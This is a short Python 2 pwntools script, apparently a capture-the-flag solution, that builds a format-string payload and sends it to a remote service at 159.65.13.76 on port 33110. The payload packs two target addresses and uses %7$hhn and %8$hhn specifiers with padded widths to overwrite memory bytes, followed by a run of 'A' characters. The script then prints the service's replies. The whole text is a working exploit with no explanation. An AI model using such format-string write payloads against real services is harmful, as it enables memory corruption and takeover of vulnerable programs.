from pwn import *

payload = p32(0x8049aa0+1)+p32(0x8049aa0)+'%125x'+'%7$hhn'+'%33x'+'%8$hhn'+'A'*255

p = remote('159.65.13.76', 33110)

print p.recv()
p.sendline(payload)
print p.recv()
print p.recv()
